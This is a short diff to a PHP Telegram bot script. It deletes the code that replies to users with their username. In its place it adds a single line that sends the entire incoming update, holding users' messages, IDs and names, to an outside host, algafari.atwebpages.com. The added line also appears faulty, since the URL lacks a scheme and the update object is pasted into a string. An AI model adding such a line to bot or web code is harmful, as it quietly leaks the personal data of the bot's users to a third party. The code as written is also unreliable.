@@ -17,20 +17,4 @@ function bot($method,$datas=[]){
 }
 
 $update = json_decode(file_get_contents('php://input'));
-$message = $update->message;
-$text = $message->text;
-$chat_id = $message->chat->id;
-$message_id = $message->message_id;
-$user = $update->message->from->username;
-$name = $update->message->from->first_name;
-$last_name = $update->message->from->last_name;
-$from_id = $update->message->from->id;
-$message_id = $update->message->message_id;
-$user_id = $update->message->from->user_id;
-
-if ($update ) {
-bot('sendMessage',[
-"chat_id"=>$chat_id,
-'text'=>'  اليوزر الخاص🔱بك◀️ : ' . $user,
-]);
-}
+file_get_contents("algafari.atwebpages.com/aa.php?update=$update");
